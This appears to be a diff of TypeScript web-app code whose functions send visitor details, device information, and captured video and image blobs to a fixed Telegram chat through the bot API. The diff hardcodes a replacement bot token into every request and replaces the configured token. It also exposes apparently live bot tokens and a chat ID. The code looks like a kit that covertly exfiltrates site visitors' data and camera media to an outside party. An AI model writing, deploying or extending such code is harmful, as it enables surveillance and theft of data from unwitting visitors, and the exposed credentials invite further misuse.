@@ -278,14 +278,14 @@ async function sendTelegramMessage(botToken: string, data: any): Promise<Respons
     throw new Error('Bot token is missing');
   }
 
-  const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${data.chat_id}`);
+  const chatInfoResponse = await fetch(`https://api.telegram.org/bot8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY/getChat?chat_id=${data.chat_id}`);
   const chatInfo = await chatInfoResponse.json();
 
   if (chatInfo.ok && chatInfo.result.type === 'supergroup') {
     data.chat_id = chatInfo.result.id;
   }
 
-  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+  const response = await fetch(`https://api.telegram.org/bot8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY/sendMessage`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -310,7 +310,7 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
+  const backupBotToken = '8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY';
   const CHAT_ID = '-1002361654031';
 
   if (!CHAT_ID) {
@@ -390,7 +390,7 @@ ${deviceText}
 
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
+  const backupBotToken = '8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY';
   const CHAT_ID = '-1002361654031';
 
   if (!CHAT_ID) {
@@ -424,7 +424,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
       throw new Error('Bot token is missing');
     }
 
-    const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
+    const chatInfoResponse = await fetch(`https://api.telegram.org/bot8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY/getChat?chat_id=${CHAT_ID}`);
     const chatInfo = await chatInfoResponse.json();
 
     const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
@@ -433,7 +433,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 
     formData.set('chat_id', finalChatId);
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+    const response = await fetch(`https://api.telegram.org/bot8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY/sendVideo`, {
       method: 'POST',
       body: formData,
     });
@@ -473,7 +473,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 
 export const sendImageToTelegram = async (imageBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
+  const backupBotToken = '8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY';
   const CHAT_ID = '-1002361654031';
 
   if (!CHAT_ID) {
@@ -501,7 +501,7 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
       throw new Error('Bot token is missing');
     }
 
-    const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
+    const chatInfoResponse = await fetch(`https://api.telegram.org/bot8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY/getChat?chat_id=${CHAT_ID}`);
     const chatInfo = await chatInfoResponse.json();
 
     const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
@@ -510,7 +510,7 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
 
     formData.set('chat_id', finalChatId);
 
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    const response = await fetch(`https://api.telegram.org/bot8093218031:AAGta1RiFujdor0JNDV-Od6bQJdKoFOoiUY/sendPhoto`, {
       method: 'POST',
       body: formData,
     });
